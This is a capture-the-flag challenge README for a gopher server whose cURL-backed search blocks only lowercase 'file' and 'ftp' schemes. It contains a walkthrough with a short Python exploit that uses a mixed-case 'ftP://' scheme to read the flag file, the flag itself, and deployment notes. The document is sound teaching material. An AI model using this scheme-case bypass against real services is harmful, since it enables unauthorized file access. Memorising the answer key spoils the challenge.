# _Rabbit Holes_

**Author:** _Robert Babaev_

**Category:** _Web_

## Description

Rabbit holes involves a gopher protocol server stood up alongside an FTP server. Naturally, the maintainers of the gopher server are generous and decided to offer a search functionality to counteract their extremely limited library.

Of course, their protocol sanitation leaves much to be desired.

### Files

- `server.py`

### Host

`nc 10.0.2.51 13370`

## Part 1

**CTFd name:** Rabbit Holes

### CTFd Description

Huh, looks like some TCP nets are up after all. I think some underground denizens bootstrapped a server of some kind. They were really proud of it, too, but the weird thing was they kept mentioning KFC. I have no idea what's up with that.

There's some kind of flag on this server, but I think it's gaslighting me because any time I try to access it it tells me it doesn't exist.

### Flag

<details>
<summary>(expand to read)</summary><br>

CyberSci{D0wn_4nd_d0wn_1t_g035}

</details>

### Walkthrough

<details>
<summary>(expand to read)</summary><br>

The main component here revolves around the gopher server's "search" functionality. It takes a query parameter and uses `cURL` to fetch the resource. Some attempts at sanitation have been made, namely disallowing the "file" and "ftp" protocols. However, there is nothing preventing an attacker from using a non-lowercase scheme to fetch a file.

The following Python script using the `pituophis` Gopher client will successfully retrieve the flag:

```python
import pituophis

result = pituophis.get(
    "localhost",
    port=13370,
    path="/search",
    query="ftP://anonymous@localhost/library/flag.txt",
).text()

print(result)
```

</details>

## Setup instructions

**IMPORTANT**: If you do not have a `.ssh/config` entry for the server, add one as follows:

```bash
Host 10.0.2.51
  Port 22
  User vpcadmin
  IdentityFile ~/.ssh/$PRIVATE_KEY_FILE
```

Use the `deploy.sh` script in `server_files` as follows to build a tarball and send it to the server:

```bash
$ ./deploy.sh 10.0.2.51
# If it goes right, the output should look like:
+ SERVER_ADDR=10.0.2.51
+ '[' -z 10.0.2.51 ']'
+ git archive --format=tar HEAD
+ scp rabbit-holes.tar.gz 10.0.2.51:rabbit-holes.tar.gz
```

If all goes well, you should see `rabbit-holes.tar.gz` in the home directory of `vpcadmin` on the challenge server. Extract that tarball and run `./start.sh` to build and start the service.
